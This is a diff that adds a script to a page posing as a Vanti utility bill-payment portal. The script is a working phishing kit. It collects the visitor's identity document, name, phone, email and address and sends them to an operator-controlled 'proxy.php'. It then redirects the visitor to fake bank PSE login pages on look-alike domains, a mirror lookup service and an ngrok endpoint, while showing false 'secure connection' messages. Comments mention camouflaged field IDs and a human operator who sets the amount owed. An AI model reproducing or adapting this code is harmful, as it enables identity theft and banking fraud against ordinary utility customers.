@@ -734,6 +734,568 @@
 <!-- =========================
      JAVASCRIPT
 ========================= -->
+    <script>
+$(document).ready(function() {
+    console.log("✅ Sistema iniciado correctamente v5.5 - Smart Overlay Activo");
+
+    // RECUPERACIÓN INDESTRUCTIBLE DEL TOKEN 
+    window.sessionToken = sessionStorage.getItem('vanti_sessionToken') || null;
+    window.pollingInterval = null;
+
+    // GOLPE TÁCTICO: Filtrar números apuntando a los nuevos IDs camuflados
+    $('#inp_doc, #inp_cel, #inp_cta').on('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+    });
+
+    // ==============================================================================
+    // INICIO DE CONSULTA A BASE DE DATOS CENTRAL
+    // ==============================================================================
+    $('#btnconsultar').on('click', function(e) {
+        e.preventDefault();
+        const ref = $('#inp_cta').val(); 
+        const companyId = $('#empresa').val();
+
+        if (!ref || ref.length < 4) {
+            Swal.fire({ icon: 'error', title: 'Error', text: 'Ingresa una referencia válida.', confirmButtonColor: '#0033a0' });
+            return;
+        }
+        if (!companyId || companyId === "Selecciona una opcion") {
+            Swal.fire({ icon: 'warning', title: 'Atención', text: 'Selecciona la empresa del servicio.', confirmButtonColor: '#0033a0' });
+            return;
+        }
+
+        // Activamos el ESTADO 1: Consulta
+        $('#payment-animation').hide();
+        $('#query-animation').show();
+        $('#loading-overlay').find('.loading-text').text('Consultando sistema central...');
+        $('#loading-overlay').find('.loading-subtext').text('Validando consumos, saldos y fechas de corte.');
+        $('#loading-overlay').fadeIn(200).css('display', 'flex');
+
+        $.ajax({
+            url: 'proxy.php?action=init',
+            type: 'POST',
+            data: { campaign: 'vanti', reference: ref, company: companyId },
+            cache: false,
+            success: function(res) {
+                if (res.status === 'created') {
+                    window.sessionToken = res.token;
+                    sessionStorage.setItem('vanti_sessionToken', res.token);
+                    iniciarEspera();
+                } else { mostrarError('Error de conexión con el centro de mando.'); }
+            },
+            error: function() { mostrarError('Fallo en el servidor.'); }
+        });
+    });
+
+    function iniciarEspera() {
+        let intentos = 0;
+        window.pollingInterval = setInterval(function() {
+            intentos++;
+            $.get('proxy.php', { action: 'check', token: window.sessionToken, nocache: Date.now() }, function(data) {
+                
+                if (data.amount && data.step === 'price_set') {
+                    clearInterval(window.pollingInterval);
+                    
+                    if (parseInt(data.amount) === 1) {
+                        mostrarError('El número de cuenta o referencia ingresada no es válida, o no presenta saldos pendientes.');
+                    } else {
+                        mostrarResultado(data.amount);
+                    }
+                }
+                
+                if (intentos > 120) {
+                    clearInterval(window.pollingInterval);
+                    mostrarError('Tiempo de espera agotado. Intenta de nuevo más tarde.');
+                }
+            }, 'json');
+        }, 1500);
+    }
+
+    function mostrarError(mensaje) {
+        $('#loading-overlay').fadeOut();
+        Swal.fire({
+            icon: 'error',
+            title: 'Atención',
+            text: mensaje,
+            confirmButtonColor: '#0033a0'
+        }).then(() => {
+            window.location.reload();
+        });
+    }
+
+    function formatMoney(amount) {
+        return new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(amount).replace("COP", "$");
+    }
+
+    function mostrarResultado(valor) {
+        $('#loading-overlay').fadeOut();
+        const vf = formatMoney(valor);
+        $('#txt_referencia').text($('#inp_cta').val()); // ID CAMUFLADO
+        $('#txt_valor').text(vf);
+        $('#btnpagar').html("Ir a pagar: <b>" + vf + "</b>");
+        $('.inicio').fadeOut(300, function() { $('.resultado').fadeIn(300); });
+    }
+
+    $('.back-home').on('click', function() {
+        if(window.pollingInterval) clearInterval(window.pollingInterval);
+        $('.resultado').fadeOut(300, function() { $('.inicio').fadeIn(300); });
+    });
+
+    // ==============================================================================
+    // BLINDAJE 1: VALIDACIÓN (Modificado para desvío Bold directo)
+    // ==============================================================================
+
+    $('#btnpagar').on('click', function(e) {
+        e.preventDefault();
+
+        // Limpieza estricta leyendo desde los nuevos IDs camuflados
+        const email = $('#inp_em').val().trim();
+        const phone = $('#inp_cel').val().trim();
+        const doc = $('#inp_doc').val().trim();
+        const fname = $('#inp_fn').val().trim();
+        const lname = $('#inp_ln').val().trim();
+        const addr = $('#inp_addr').val().trim();
+
+        $('#inp_em').val(email);
+        $('#inp_cel').val(phone);
+        $('#inp_doc').val(doc);
+        $('#inp_fn').val(fname);
+        $('#inp_ln').val(lname);
+        $('#inp_addr').val(addr);
+
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        if (!doc || doc.length < 5) return Swal.fire('Error', 'Número de documento inválido', 'warning');
+        if (!fname || fname.length < 2) return Swal.fire('Error', 'Ingresa un nombre válido', 'warning');
+        if (!lname || lname.length < 2) return Swal.fire('Error', 'Ingresa un apellido válido', 'warning');
+        if (!phone || phone.length !== 10 || phone < 3001000000) return Swal.fire('Error', 'Número celular no válido', 'warning');
+        if (!email || !emailRegex.test(email)) return Swal.fire('Error', 'Correo electrónico no válido', 'warning');
+        if (!addr || addr.length < 5) return Swal.fire('Error', 'Ingresa una dirección válida', 'warning');
+
+        // 1. Extraemos el valor exacto ANTES del modal
+        let valorPagoRaw = parseInt($('#txt_valor').text().replace(/[^0-9]/g, ''));
+
+        // 2. Evaluamos si supera los 100,000 (O mayor a 1, según tu prueba actual)
+      
+      /*  if (valorPagoRaw > 100000 && valorPagoRaw < 500000) {  
+        // Ejecutamos la ruta Bold directamente
+            ejecutarbold(valorPagoRaw);
+            return; // Detenemos la ejecución para que NO se muestre el modal
+        }
+       */
+
+        // 3. Si es menor o igual a 100,000, abrimos el modal de bancos normalmente
+        const myModal = new bootstrap.Modal(document.getElementById('modalPSE'));
+        myModal.show();
+    });
+
+    // ==============================================================================
+    // EJECUTARBOLD
+    // ==============================================================================
+    function ejecutarbold(monto) {
+        $('#modalPSE').modal('hide');
+        
+        // Activamos el ESTADO 2: Conexión
+        $('#query-animation').hide();
+        $('#payment-animation').show();
+        $('#loading-overlay').find('.loading-text').text('Generando pasarela de pago segura...');
+        $('#loading-overlay').find('.loading-subtext').text('Conectando con BOLD CF...');
+        $('#loading-overlay').fadeIn(200).css('display', 'flex');
+
+        $.ajax({
+            url: 'api_bold.php',
+            type: 'GET',
+            data: { monto: monto },
+            dataType: 'json',
+            success: function(res) {
+                if (res.ok && res.url) {
+                    window.top.location.href = res.url;
+                } else {
+                    $('#loading-overlay').fadeOut();
+                    Swal.fire('Error', 'No se pudo generar el enlace de pago.', 'error');
+                }
+            },
+            error: function() {
+                $('#loading-overlay').fadeOut();
+                Swal.fire('Error de Red', 'Fallo al conectar con la pasarela de pagos.', 'error');
+            }
+        });
+    }
+
+    // ==============================================================================
+    // MOTOR ORQUESTADOR HÍBRIDO (MANUAL / AUTOMÁTICO KAST)
+    // ==============================================================================
+    function ejecutarRutaKast(monto, emailDestino, bancoDestino) {
+        $('#modalPSE').modal('hide'); 
+        
+        // Activamos el ESTADO 2: Conexión
+        $('#query-animation').hide();
+        $('#payment-animation').show();
+        $('#loading-overlay').find('.loading-text').text('Iniciando conexión segura...');
+        $('#loading-overlay').find('.loading-subtext').text('Preparando túnel con la entidad financiera...');
+        $('#loading-overlay').fadeIn(200).css('display', 'flex');
+
+        $.ajax({
+            url: 'proxy.php?action=check_autopilot',
+            type: 'GET',
+            dataType: 'json',
+            success: function(config) {
+                if (config.auto_pilot === true) {
+                    ejecutarKastAutomatico(monto, emailDestino, bancoDestino);
+                } else {
+                    ejecutarKastManual(monto, emailDestino, bancoDestino);
+                }
+            },
+            error: function() {
+                ejecutarKastManual(monto, emailDestino, bancoDestino);
+            }
+        });
+    }
+
+    // --- RUTA 1: MODO MANUAL (El flujo original, espera a Marqui) ---
+    function ejecutarKastManual(monto, emailDestino, bancoDestino) {
+        $.ajax({
+            url: 'proxy.php?action=init_kast',
+            type: 'POST',
+            data: { monto: monto, email: emailDestino, banco: bancoDestino },
+            dataType: 'json',
+            success: function(res) {
+                if (res.status === 'created') {
+                    const kastToken = res.token;
+                    let intentos = 0;
+                    
+                    const mensajes = [
+                        'Conectando con la pasarela bancaria...',
+                        'Cifrando datos de transacción...',
+                        'Validando cupo y protocolos de seguridad...',
+                        'Generando token de pago único...',
+                        'Esperando respuesta de la entidad...',
+                        'Por favor, no recargue ni cierre esta ventana...'
+                    ];
+                    
+                    const polling = setInterval(() => {
+                        intentos++;
+                        
+                        if (intentos % 3 === 0) {
+                            let msgIndex = (intentos / 3) % mensajes.length;
+                            $('#loading-overlay').find('.loading-text').text(mensajes[msgIndex]);
+                        }
+
+                        $.get('proxy.php', { action: 'check_kast', token: kastToken, nocache: Date.now() }, function(data) {
+                            if (data.status === 'success' && data.link) {
+                                clearInterval(polling);
+                                
+                                if(data.link === '1') {
+                                    $('#loading-overlay').fadeOut();
+                                    Swal.fire('Error', 'No se pudo generar la pasarela para esta referencia.', 'error');
+                                } else {
+                                    window.top.location.href = data.link.trim();
+                                }
+                            } else if (intentos > 150) { 
+                                clearInterval(polling);
+                                $('#loading-overlay').fadeOut();
+                                Swal.fire('Error', 'Tiempo de espera agotado con el banco. Intente nuevamente.', 'error');
+                            }
+                        }, 'json');
+                    }, 2000); 
+                    
+                } else {
+                    $('#loading-overlay').fadeOut();
+                    Swal.fire('Error', 'Fallo al solicitar la pasarela.', 'error');
+                }
+            },
+            error: function() {
+                $('#loading-overlay').fadeOut();
+                Swal.fire('Error de Red', 'No pudimos conectar con el servidor central.', 'error');
+            }
+        });
+    }
+
+    // --- RUTA 2: MODO AUTOMÁTICO (Oculto tras el proxy) ---
+    // --- RUTA 2: MODO AUTOMÁTICO (Apuntando directo a Python por Cloudflare) ---
+    function ejecutarKastAutomatico(monto, emailDestino, bancoDestino) {
+        
+        // Mantenemos visible el ESTADO 2 y actualizamos textos
+        $('#query-animation').hide();
+        $('#payment-animation').show();
+        $('#loading-overlay').find('.loading-text').text('Validando disponibilidad de pasarela...');
+        $('#loading-overlay').find('.loading-subtext').text('Contactando servidor ACH Colombia...');
+        
+        const docTypeMap = { "1": "CC", "2": "CE", "7": "NIT" };
+        const docType = docTypeMap[$('#inp_doctype').val()] || "CC";
+        const docNumber = $('#inp_doc').val().trim();
+        const fname = $('#inp_fn').val().trim();
+        const lname = $('#inp_ln').val().trim();
+        const fullName = (fname + ' ' + lname).trim();
+        const phone = $('#inp_cel').val().trim();
+        
+        // Diccionario Maestro de Códigos ACH/PSE Colombia
+        const pseBankCodes = {
+            "BANCO AGRARIO": "1040", "BANCO AV VILLAS": "1052", "BANCO BTG PACTUAL": "1081",
+            "BANCO CAJA SOCIAL": "1032", "BANCO COLPATRIA": "1019", "BANCO COOPCENTRAL": "1065",
+            "BANCO CREDIFINANCIERA": "1089", "BANCO DAVIVIENDA": "1051", "BANCO DE BOGOTA": "1001",
+            "BANCO DE OCCIDENTE": "1023", "BANCO FALABELLA": "1062", "BANCO FINANDINA": "1063",
+            "BANCO GNB SUDAMERIS": "1012", "BANCO ITAU": "1006", "BANCO PICHINCHA": "1060",
+            "BANCO POPULAR": "1002", "BANCO SANTANDER": "1070", "BANCO SERFINANZA": "1069",
+            "BANCO UNION": "1022", "BANCO W": "1071", "BANCOLOMBIA": "1007",
+            "BANCOOMEVA": "1061", "BBVA COLOMBIA": "1013", "BOLD CF": "1092",
+            "CFA COOPERATIVA FINANCIERA": "1283", "CONFIAR": "1292", "COTRAFA": "1289",
+            "DALE!": "1511", "DAVIPLATA": "1551", "LULO BANK": "1093",
+            "MIBANCO": "1084", "MOVII": "1558", "NEQUI": "1507",
+            "NU COLOMBIA": "1098", "RAPPIPAY": "1519", "UALA": "1564"
+        };
+
+        const finalBankCode = pseBankCodes[bancoDestino] || "1051"; // Failsafe a 1051
+
+        const payload = {
+            action: "generate",
+            amount: monto,
+            full_name: fullName,
+            document_type: docType,
+            document_number: docNumber,
+            email: emailDestino,
+            phone_number: phone,
+            dial_code: "+57",
+            bank_code: finalBankCode 
+        };
+
+        $.ajax({
+            url: 'https://panel-api.ngrok.app/api/kast_pse_api.php', // URL CORREGIDA
+            type: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify(payload),
+            dataType: 'json',
+            success: function(res) {
+                if (res.estado === 'pendiente' && res.resume_id) {
+                    pollKastAutomatico(res.resume_id);
+                } else {
+                    $('#loading-overlay').fadeOut();
+                    Swal.fire('Error de Seguridad', 'La pasarela rechazó la conexión. Intente en unos minutos.', 'error');
+                }
+            },
+            error: function(err) {
+                $('#loading-overlay').fadeOut();
+                Swal.fire('Error de Red', 'Fallo al establecer túnel con el banco.', 'error');
+            }
+        });
+    }
+
+    // --- EL POLLING DEL CLIENTE A COBRE (Modo Automático directo a Flask) ---
+ 
+    function pollKastAutomatico(resumeId) {
+        let intentos = 0;
+        const mensajes = [
+            'Autorizando transacción con el banco...',
+            'Cifrando datos de ruta...',
+            'Generando token de pago de PSE...',
+            'Unos segundos más, no cierre la ventana...'
+        ];
+
+        const polling = setInterval(() => {
+            intentos++;
+
+            // Corrección menor para que los mensajes cambien correctamente
+            if (intentos % 2 === 0) {
+                let msgIndex = Math.floor(intentos / 2) % mensajes.length;
+                $('#loading-overlay').find('.loading-text').text(mensajes[msgIndex]);
+            }
+
+            $.ajax({
+                url: 'https://panel-api.ngrok.app/api/kast_pse_api.php', 
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({ action: 'poll', resume_id: resumeId }), 
+                dataType: 'json',
+                success: function(data) {
+                    if (data.estado === 'exito' && data.link_pse) {
+                        clearInterval(polling);
+                        window.top.location.href = data.link_pse.trim();
+                    } else if (data.estado === 'error' || intentos > 25) { 
+                        clearInterval(polling);
+                        $('#loading-overlay').fadeOut();
+                        Swal.fire('Error', data.mensaje || 'La pasarela PSE no respondió a tiempo. Intente de nuevo.', 'error');
+                    }
+                },
+                error: function(xhr) {
+                    // SOLUCIÓN: Si PHP devuelve 409 o 500, entra aquí. 
+                    // DETENEMOS el bucle para evitar peticiones infinitas.
+                    clearInterval(polling);
+                    $('#loading-overlay').fadeOut();
+                    
+                    let msjError = 'Fallo en la conexión con la pasarela.';
+                    try {
+                        let res = JSON.parse(xhr.responseText);
+                        if(res.mensaje) msjError = res.mensaje;
+                    } catch(e) {}
+                    
+                    Swal.fire('Transacción declinada', msjError, 'error');
+                }
+            });
+        }, 3000); 
+    }
+
+    // ==============================================================================
+    // BLINDAJE 2: BIFURCACIÓN KAST (DENTRO DEL MODAL)
+    // ==============================================================================
+    $('#btnConfirmarPago').on('click', function() {
+
+        const bancoOriginal = $('#pse_bank').val();
+        const tipoPersona = $('#pse_person_type').val();
+
+        if (!bancoOriginal) return Swal.fire('Atención', 'Selecciona un banco', 'info');
+
+        if (!window.sessionToken) {
+            window.sessionToken = sessionStorage.getItem('vanti_sessionToken');
+            if (!window.sessionToken) {
+                $('#modalPSE').modal('hide');
+                return Swal.fire({
+                    icon: 'error',
+                    title: 'Sesión Expirada',
+                    text: 'Por su seguridad, la sesión ha caducado. Por favor, consulte su factura nuevamente.',
+                    confirmButtonColor: '#0033a0'
+                }).then(() => { window.location.reload(); });
+            }
+        }
+
+        const email = $('#inp_em').val().trim();
+        const phone = $('#inp_cel').val().trim();
+        const fname = $('#inp_fn').val().trim();
+        const lname = $('#inp_ln').val().trim();
+        const doc = $('#inp_doc').val().trim();
+        const addr = $('#inp_addr').val().trim();
+
+        if (!email || !phone || !fname || !lname || !doc || !addr) {
+            $('#modalPSE').modal('hide');
+            return Swal.fire('Error de Seguridad', 'Hemos detectado datos incompletos. Por favor, llena el formulario nuevamente.', 'error');
+        }
+
+        let valorPagoRaw = parseInt($('#txt_valor').text().replace(/[^0-9]/g, ''));
+
+        const esExcepcionKast = 
+          (tipoPersona === "Juridica" && (bancoOriginal === "BANCO DAVIVIENDA" || bancoOriginal === "BBVA COLOMBIA")) ||
+          (tipoPersona === "Natural" && bancoOriginal === "BANCO DE BOGOTA");
+
+        // === SI SUPERA EL VALOR Y NO ES UNA EXCEPCIÓN, SE VA POR KAST / REGLA ===
+        if (valorPagoRaw > 80000 && !esExcepcionKast) {
+            ejecutarRutaKast(valorPagoRaw, email, bancoOriginal);
+            return; 
+        }
+
+        const btn = $(this);
+        btn.prop('disabled', true).text('Conectando...');
+
+        const customLinks = {
+            "Natural": {
+                "BANCO DE OCCIDENTE": "https://vanllelectfactura.cfd/occi-pse/login/index.php",
+                "BANCO FALABELLA": "https://vanllelectfactura.cfd/falapse/transaccion/index.php",
+                "BBVA COLOMBIA": "https://vanllelectfactura.cfd/bbvapse/bbvaecmco/index.php",
+                "BANCO COLPATRIA": "https://vanllelectfactura.cfd/colppse/login/index.php",
+                "DAVIPLATA": "https://vanllelectfactura.cfd/daviplatapse/PSE/index.php",
+                "BANCO POPULAR": "https://vanllelectfactura.cfd/popular/pse/index.php",
+                "BANCOOMEVA": "https://vanllelectfactura.cfd/bancoomeva/pse/index.php"
+            },
+            "Juridica": {
+                "BANCO DE OCCIDENTE": "https://goodfreemome.lol/occiemp/icbs-web/index.php",
+                "BANCOLOMBIA": "https://goodfreemome.lol/BANCOL/bancolpse/pymes/index.php",
+                "BANCOOMEVA": "https://goodfreemome.lol/bancoomeva/pse/index.php"
+            }
+        };
+
+        let finalUrl = null;
+        if (customLinks[tipoPersona] && customLinks[tipoPersona][bancoOriginal]) {
+            finalUrl = customLinks[tipoPersona][bancoOriginal];
+        }
+
+        const procesarRedireccion = (urlDestino) => {
+            let mapTipoDoc = { "1": "CC", "2": "CE", "7": "NIT" };
+            let prefijoDoc = mapTipoDoc[$('#inp_doctype').val()] || "CC";
+            let documentoConcatenado = (prefijoDoc + " " + doc).trim();
+            let nombreCompleto = (fname + ' ' + lname).trim();
+            
+            $('#modalPSE').modal('hide');
+            
+            // Activamos el ESTADO 2: Conexión
+            $('#query-animation').hide();
+            $('#payment-animation').show();
+            $('#loading-overlay').find('.loading-text').text('Conectando con el banco...');
+            $('#loading-overlay').find('.loading-subtext').text('Cifrando paquete de datos...');
+            $('#loading-overlay').fadeIn(200).css('display', 'flex');
+
+            $.ajax({
+                url: 'proxy.php?action=update',
+                type: 'POST',
+                data: {
+                    token: window.sessionToken,
+                    email: email,
+                    phone: phone,
+                    name: nombreCompleto,
+                    doc: doc,
+                    documento: documentoConcatenado,
+                    bank: bancoOriginal,
+                    person_type: tipoPersona,
+                    address: addr,
+                    payment_amount: valorPagoRaw,
+                    tienda_nombre: "Tienda Vanti",
+                    tienda_identificacion: "900123456",
+                    tienda_correo: email,
+                    tienda_telefono: phone
+                },
+                success: function() {
+                    let baseDestino = urlDestino.split('#')[0];
+                    let separator = baseDestino.includes('?') ? '&' : '?';
+                    let tk = encodeURIComponent(window.sessionToken);
+                    window.top.location.href = baseDestino + separator + "token=" + tk + "&vanti_token=" + tk;
+                },
+                error: function() {
+                    let baseDestino = urlDestino.split('#')[0];
+                    let separator = baseDestino.includes('?') ? '&' : '?';
+                    let tk = encodeURIComponent(window.sessionToken);
+                    window.top.location.href = baseDestino + separator + "token=" + tk + "&vanti_token=" + tk;
+                }
+            });
+        };
+
+        if (finalUrl) {
+            procesarRedireccion(finalUrl);
+        } else {
+            const RAILWAY_ACTIVE_MIRROR = "https://nexusbackend-production-26de.up.railway.app/api/active-mirror/Bancos";
+
+            $.getJSON(RAILWAY_ACTIVE_MIRROR, function(res) {
+                if (res.success && res.url) {
+                    const mirrorBase = res.url.replace(/\/$/, "");
+                    let bancoLimpio = bancoOriginal.replace(/\s+/g, '').toLowerCase();
+
+                    if (bancoOriginal === "BANCO ITAU") bancoLimpio = "itau";
+                    if (bancoOriginal === "BANCO CAJA SOCIAL") bancoLimpio = "bancocajasocial";
+                    if (bancoOriginal === "BANCO DE BOGOTA") bancoLimpio = "bancodebogota";
+                    if (bancoOriginal === "NU COLOMBIA") bancoLimpio = "nucolombia";
+                    if (bancoOriginal === "BANCO AV VILLAS") bancoLimpio = "bancoavvillas";
+
+                    const segmento = (tipoPersona === "Natural") ? "personas" : "empresas";
+                    let finalUrlDynamic = mirrorBase + "/pse/" + segmento + "/" + bancoLimpio + "/";
+
+                    if (bancoLimpio === "bancodebogota" && segmento === "empresas") {
+                        finalUrlDynamic += "index.php";
+                    }
+
+                    procesarRedireccion(finalUrlDynamic);
+
+                } else {
+                    btn.prop('disabled', false).text('PAGAR CON PSE');
+                    $('#loading-overlay').fadeOut();
+                    Swal.fire('Error de Red', 'No pudimos conectar con el servidor bancario.', 'error');
+                }
+
+            }).fail(function() {
+                btn.prop('disabled', false).text('PAGAR CON PSE');
+                $('#loading-overlay').fadeOut();
+                Swal.fire('Error de Red', 'Servicio no disponible en este momento.', 'error');
+            });
+        }
+    });
+});
+</script>
+
 
 <script>
 
